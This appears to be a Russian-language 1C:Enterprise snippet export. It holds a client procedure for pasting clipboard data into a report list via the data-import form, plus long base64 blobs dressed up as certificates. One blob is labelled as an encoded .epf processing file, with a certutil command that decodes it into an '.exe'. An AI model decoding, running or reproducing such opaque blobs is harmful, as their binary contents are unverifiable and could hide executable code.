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
uze9neUDV97ed7bQ5vySend289K2s7Owvz6zvbd+iDaXlxdn5m7c3Lx+qC68uXXv
xvrqIpqaumCvaLvuwSUyxL09l1xmX1lE7lu39ueUNXVu6/LW3O5VPHd4c29+yXp3
bXVxY25lYd9ZvbRPHoXsFWuPDDG3uqC5yuK2s2Qd0lH9IWdvdmbw+87uvL4+s3C4
JlsH15eu3vKuLN69tmnue1tkyJX5PXf3nX0yxLU31Xtz8uKGN/P2HXLpHXfGOrRX
F287snrHVbYPvZnlO3Pywr67887m7JWNO86MdnhtdwF1Vu5t02HJEHkjx4bd91be
3Sez1JyZxBBauGgyxNB1K8u35+T1fWd38XBOCRccLZI81iJDzO5sIO/KG/rcgSXT
p68daAfekkmGfJtw4jJaW7K2HOXqNuFOQPLb8rUry7dD2lBaDF9EbPLe9tpWlmOU
I7mTJ4ybsQ7cA0tZX5mND3PbSQ1DhyikQTQMYfS7juIdxhajZsjpKd6BpswfaIR5
7v781ht3yXBrN965d2NN3th2Vt6OzWTj0L4RzYTOovz2O2QWRD4u763J72xev4n+
8c0b9/a91cW75M9vyRBrq1c3nJVltL569XCOyf7d/XfkZeRRvVDm/zZSweDdHq26
Xl0raxWWwndY5Ol5TN+P/h8NCjAwMDAwMDIwIDAwMDAwMDIwIDdmZmZmZmZmIA0K
8Lx52k9DAgDwvHnaT0MCAAAAAAByAG8AbwB0AAAAAAANCjAwMDAwMDJlIDAwMDAw
MjAwIDdmZmZmZmZmIA0Ke797f7WRjkVaapKlYXKqrmGSuYGuSZJpom6SSZKhrlmS
mZlRsklSiqWZqU4tAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAN
CjAwMDAwMDI2IDAwMDAwMDI2IDdmZmZmZmZmIA0K8Lx52k9DAgDwvHnaT0MCAAAA
AAB2AGUAcgBzAGkAbwBuAAAAAAANCjAwMDAwMDFjIDAwMDAwMjAwIDdmZmZmZmZm
IA0Ke797fzUvV7WRoZmOgQ6QYWFgbGikY1DLywVCAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANCjAwMDAwMDI4IDAw
MDAwMDI4IDdmZmZmZmZmIA0K8Lx52k9DAgDwvHnaT0MCAAAAAAB2AGUAcgBzAGkA
bwBuAHMAAAAAAA0KMDAwMDAyMTQgMDAwMDAyMTQgN2ZmZmZmZmYgDQqNU03OFjEI
vsusBwMU2nIcaEvybXyNGhNjPJkLj+QVZFy4/rYd5uH548+v3z/oJr2v60ZW9kUN
8KiC+GIwdwPW2ZzNcsW+L9a++ZDDlhEgjRFsnwEWQWTWgzSuO3ofAzVByQikxwFT
TEDHHWmLcvX3YX3A65YZ3LsuIMsJYkzgPhHCkHm3tpuu+2q2imV3OEcHyBKGSEk4
9WhmuPBQqRw0sAjA7rhATpdaNydE2MI1pfvJ92E9zBaJOhYQNWIQjmJmxay+88gl
Gl6eFegUxg2KLrVTGaZnwDgqJXR343bdqcM0np/THWR2hEkboW/LdOw5Md+H9TDD
ItQTB7Qxa07Rilkg+DktxzkidO5r5gmjdYBiIEioQ0iJ6BUgL4ltXa97iM0Wtp/n
8aTZyv/DMBrzmjNdl91XLN7E06EZVuaYDiblSveBlLQmz39p7hjLqGcF7pW6oxTa
MOj6OCsUtErnen36/vYxX9d9Smg/icCxy2N0BscZtcZFacxUivvaw62VBXAydrlX
bbHHHGbfSq2Rc6VPiZ1bVaxyKb3JDWY7AlkD1ASV1d+H9SixeohmCdOkEsPoYK3O
pi4GR+5Z/rX7+vx6fa2m7D71OadDuzocfUMMKkvXqqJXMmPURXw7n7+8vT7WeAGv
uYuC7YIetcTbOZVhps6F8yz9P/7luvtIotWs4tOniKvKo72VZxPD5j5O+fMv
-----END CERTIFICATE-----"}
},
{2,
{"Подключаемый_Список_ВставитьИзБуфера + Обработка ЗагрузкаДанныхИзФайла.epf",1,0,"",""},
{0,
{"Подключаемый_Список_ВставитьИзБуфера",0,0,"","&НаКлиенте
Процедура Подключаемый_Список_ВставитьИзБуфера(Команда)
	ПутьКСписку = СтрЗаменить(Команда.Имя, ""ВставитьИзБуфера"", """");
	
	Список = ЭтотОбъект[ПутьКСписку];
	ПолеСписка = Элементы[ПутьКСписку];
	
	Индекс = ПутьКДаннымЭлементов.ПоИмени[ПутьКСписку];
	Сведения = ОтчетыКлиент.СведенияОЭлементеНастройки(Отчет.КомпоновщикНастроек, Индекс);
	ПользовательскиеНастройки = Отчет.КомпоновщикНастроек.ПользовательскиеНастройки.Элементы;
	
	ПараметрыВыбора = ОтчетыКлиентСервер.ПараметрыВыбора(Сведения.Настройки, ПользовательскиеНастройки, Сведения.Элемент);
	Список.ТипЗначения = ОтчетыКлиент.ТипЗначенияОграниченныйСвязьюПоТипу(
		Сведения.Настройки, ПользовательскиеНастройки, Сведения.Элемент, Сведения.Описание);
	
	ПараметрыПоиска = Новый Структура;
	ПараметрыПоиска.Вставить(""ОписаниеТипов"", ОписаниеТиповБезПримитивных(Список.ТипЗначения));
	ПараметрыПоиска.Вставить(""ПредставлениеПоля"", ПолеСписка.Заголовок);
	ПараметрыПоиска.Вставить(""Сценарий"", ""ВставкаИзБуфераОбмена"");
	ПараметрыПоиска.Вставить(""ПараметрыВыбора"", ПараметрыВыбора);
	
	Обработчик = Новый ОписаниеОповещения(""ВставитьИзБуфераЗавершение"", ЭтотОбъект, ПутьКСписку);
	
	МодульЗагрузкаДанныхИзФайлаКлиент = ОбщегоНазначенияКлиент.ОбщийМодуль(""ЗагрузкаДанныхИзФайлаКлиент"");
	МодульЗагрузкаДанныхИзФайлаКлиент.ПоказатьФормуЗаполненияСсылок(ПараметрыПоиска, Обработчик);
КонецПроцедуры

// Открывает форму загрузки данных для заполнения табличной части сопоставления ссылок в подсистеме ""Варианты отчетов"".
//
// Параметры: 
//   ПараметрыЗагрузки   - Структура           - см. ЗагрузкаДанныхИзФайлаКлиент.ПараметрыЗагрузкиДанных.
//   ОповещениеОЗагрузке - ОписаниеОповещения  - оповещение, которое будет вызвано для добавления загруженных данных в
//                                               табличную часть.
//
Процедура ПоказатьФормуЗаполненияСсылок(ПараметрыЗагрузки, ОповещениеОЗагрузке) Экспорт
	
	ОткрытьФорму(""Обработка.ЗагрузкаДанныхИзФайла.Форма"", ПараметрыЗагрузки,
		ОповещениеОЗагрузке.Модуль,,,, ОповещениеОЗагрузке);
		
КонецПроцедуры"}
},
{0,
{"ЗагрузкаДанныхИзФайла.epf (зашифрованные в Base64) (расшифровать так: certutil -f -decode ШифрованныйФайл.txt РасшифрованныйФайл.exe)",0,0,"","-----BEGIN CERTIFICATE-----
////fwACAAATAAAAAAAAAA0KMDAwMDAwZTQgMDAwMDAyMDAgN2ZmZmZmZmYgDQov
AgAArgIAAP///3/NBAAAUAUAAP///3+vkwAAMpQAAP///39jqAAA4qgAAP///38B
qwAAhKsAAP///3+uuAAALbkAAP///39MuwAAz7sAAP///3/uvQAAbb4AAP///3+M
wAAAD8EAAP///3+z1AAANtUAAP///3/E2wAAQ9wAAP///39i3gAA5d4AAP///3/r
+AAAMvkAAP///39y+wAA8fsAAP///38Q/gAAj/4AAP///3+uAAEAMQEBAP///38j
CwEAYgsBAP///3+BDQEAxg0BAP///3/lDwEALBABAP///38AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0KMDAwMDAwNjAgMDAwMDAw
NjAgN2ZmZmZmZmYgDQqQv7pbY0MCAJC/ultjQwIAAAAAADIAZAAxADcAMgA1ADcA
YgAtADcANQA3AGEALQA0ADcAZAA2AC0AOABiADAANAAtADAANwA5AGIANwBjADYA
ZQA0ADcANwA0AAAAAAANCjAwMDAwMGUwIDAwMDAwMjAwIDdmZmZmZmZmIA0KlVBB
SgQxELwv7B+GeE1DOslMT56TnokPEDxJQFBPXgV9wD5gYYVVl8UvdF7iF8zOOHrQ
i026qBRdnXR/HN6vUK9XM5iJuRPaWTTajki2JQZqKYKnsYOejQdDgWnokifyWSt5
lK3synW5kb28Vf5Q8yjHcl/u5Klqm3p/lYNs1dxZXVyq37ZGnn98jbzIvim33876
jqpfQu1sMj1FBvQBwQfuIHIk8K4lZI9xsKydNl8Bf8ASeWq4TKzOlEYy/fkYIww8
JPC2D8COXJ04tpE8pxRQY/5Xuc3r1elMW164yZ8AAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANCjAwMDAwMDY0IDAwMDAwMDY0
IDdmZmZmZmZmIA0KkL+6W2NDAgCQv7pbY0MCAAAAAAAyAGQAMQA3ADIANQA3AGIA
LQA3ADUANwBhAC0ANAA3AGQANgAtADgAYgAwADQALQAwADcAOQBiADcAYwA2AGUA
NAA3ADcANAAuADAAAAAAAA0KMDAwMDhlNDAgMDAwMDhlNDAgN2ZmZmZmZmYgDQrt
vWuTXEeVKPpZjtB/2NEEQ/Vx7fJ+1sPCdpxhOMzMtWEuMGDgEhP1BHOETdjGYzN2
hCVhjI8YywhzrTBYQthzTMQ5E7RltdVqSa2/UPUXzh+4f+FmrszcO987c9eu6mq5
LJC6q/bOx8q1Vq73+v/u3P+3rH36oX/LBu2oHaP/pzn6B/8Q0f9CzV/sP/QYehc/
j/7Zef7nO+2d+Xvzvfmni9cXF+a35ofzvWB+E31wb35vcXHxRjC/ESzOze8vXkef
3ZgfLd5E3xzMD3deO/3Qa3hOmDumS0FjJu08mYxGvV4ext00DrPZJA/74xz/Guej
vN+PJ8MxmvXafB8Nuo8mw/MfovkvLs6joffnd3fag1kyzSeTUZhmgwSNkU/C/iya
hFncHfUn8SQf5yM8BhrhYH59foRWThZ9gP58gH66DqPfIHPswOKc1oX34TQ5evA1
vN/oNQLLJMF/h2iiJErSbtoLe/1uP8yG+Szs571u2E/zYa87jcaD0ZBALmoP0B4+
QkB9fX4Xrfl9tI+7sIub6P97i0sIRvi3/fmdxW92yLlFrxX/EpDjP0kbJk/bGVkR
Phr0Q6+dkvOJyFvwMF0u/bkcI8UPv4YGGk/ydJBNorA3mQzDbJSjpQ+SXjhIx+PR
dNDtDSNuw377TdF+ry/OAzKhs1r8anER7RHv+mjxFkGs+d6OiqHSO8H8vvIS2/Ty
oEkJIsMYGCDor54nVFIvqGRoh5cRJD4BTLiuEhv67V2EA5ckSj3QQKoYR0u1hLjR
SAEaQByqOfjFPWBPFIqvtXd22ogsQsIldnbIrslXbD6yg38avvji9Plnd+AVedIC
R9vFXJ6YmnsdSg4s6mhxCcERk+A9YE3kGMrD2tMf18oOJl7mYJI+haIMfifgR/R0
CX6Qw0hKvi89n5B5k3Y6ScejfjQO86g/Qix0Ngz7w7gfdtFnk1k+i3sxOR72t88h
Rcsc0sppSrpID+a3gsW/z++gFR4CPzsqvkMX3x6a4g5mbwEamNyMtwI0yhHidQfw
8A16we3jO3n+yeLC4pf4wQB99Qlihnj3e3iWO3hmPBl6AwFl8Wtgm2iSX6IBbqOv
0VCnH2rhx2E3B/jlxeuPBk89M37+uReem70YfGM2e2Y8Db768nh6th1842fTZ+kn
XxmeHQews8XrnV0ZN2viZV6cZsl2NUOovzM8JkiY9dM4GUeDMMl7M8QOkkE4SvpR
mPSzyaQ/mM7G8RTe5ZmCH6fuN49vcOvfQwiAseIc+vce+n1//kc8+uLthm/9GAst
yp0ft+lVvsV8P8ynx1Fyr+y4udf8T0huPIc2fgBwvFfIkUdo3efgvVvcBRU1Rr3p
2qg3kvA1eo3dSHHxNxUUyouL+yjO0nEUzXrhMEuQTD+eIIEh7g/Cfn+aZd3eZNzr
9mFfORVmfI4UkQw6hJvKsbxbksMOf5cKxIbftJOSyHAZDNICLpH0JxZ+iuF4+W+T
NtPgxLHs8pvT6doRyBHBilsBLXTSH8/yURTm+RTJEZN4Gg660TBMknHcjZI4GmS5
C/g5ynoPqONNQnmLSzvt4WiQRmk3CWezQYbmGI/C4STuhnG/34/ySZJO07HTHKVu
+wHMsAe85+78CnqW8KtiTjgil71h8DgtkGmm+G4bTrPRdJiHSTqahlky7IWj7gCN
